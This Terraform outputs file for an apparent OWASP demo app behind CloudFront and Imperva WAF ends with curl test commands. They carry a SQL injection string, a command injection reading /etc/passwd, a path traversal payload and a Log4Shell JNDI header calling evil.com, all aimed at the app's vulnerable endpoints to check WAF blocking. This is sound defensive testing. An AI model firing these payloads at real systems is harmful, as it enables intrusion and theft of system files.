# ==============================================================================
# Terraform Outputs
# ==============================================================================

output "demo_portal_url" {
  description = "Main entry URL for the OWASP Demo Web App"
  value       = var.set_alternative_domain ? "https://${var.alternative_domain_name}" : "https://${aws_cloudfront_distribution.demo_cf.domain_name}"
}

output "cloudfront_domain_name" {
  description = "Domain name of the AWS CloudFront distribution"
  value       = aws_cloudfront_distribution.demo_cf.domain_name
}

output "cloudfront_distribution_id" {
  description = "ID of the AWS CloudFront distribution"
  value       = aws_cloudfront_distribution.demo_cf.id
}

output "alb_dns_name" {
  description = "DNS name of the AWS Application Load Balancer"
  value       = aws_lb.demo_alb.dns_name
}

output "imperva_site_id" {
  description = "Numeric Site ID created in Imperva Cloud WAF"
  value       = incapsula_site_v3.aws_site.id
}

output "imperva_origin_domain" {
  description = "Imperva Origin Domain configured in CloudFront and x-impv-origin-domain header"
  value       = local.imperva_origin_domain
}

output "curl_test_home_command" {
  description = "cURL command to test home page via CloudFront with proper Host header"
  value       = "curl -i -s -H \"Host: ${var.alternative_domain_name}\" \"https://${aws_cloudfront_distribution.demo_cf.domain_name}/\""
}

output "curl_sqli_test_command" {
  description = "cURL command to test SQL Injection protection via CloudFront"
  value       = "curl -i -s -H \"Host: ${var.alternative_domain_name}\" \"https://${aws_cloudfront_distribution.demo_cf.domain_name}/api/vulnerabilities/sqli?query=%27%20OR%20%271%27=%271%27%20--\""
}

output "curl_rce_test_command" {
  description = "cURL command to test OS Command Injection / RCE protection via CloudFront"
  value       = "curl -i -s -H \"Host: ${var.alternative_domain_name}\" \"https://${aws_cloudfront_distribution.demo_cf.domain_name}/api/vulnerabilities/rce?cmd=%3B%20cat%20%2Fetc%2Fpasswd\""
}

output "curl_lfi_test_command" {
  description = "cURL command to test Path Traversal / LFI protection via CloudFront"
  value       = "curl -i -s -H \"Host: ${var.alternative_domain_name}\" \"https://${aws_cloudfront_distribution.demo_cf.domain_name}/api/vulnerabilities/lfi?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd\""
}

output "curl_log4shell_test_command" {
  description = "cURL command to test Log4Shell / JNDI header injection protection via CloudFront"
  value       = "curl -i -s -H \"Host: ${var.alternative_domain_name}\" -H \"X-Api-Version: $${jndi:ldap://evil.com/a}\" \"https://${aws_cloudfront_distribution.demo_cf.domain_name}/api/vulnerabilities/log4shell\""
}
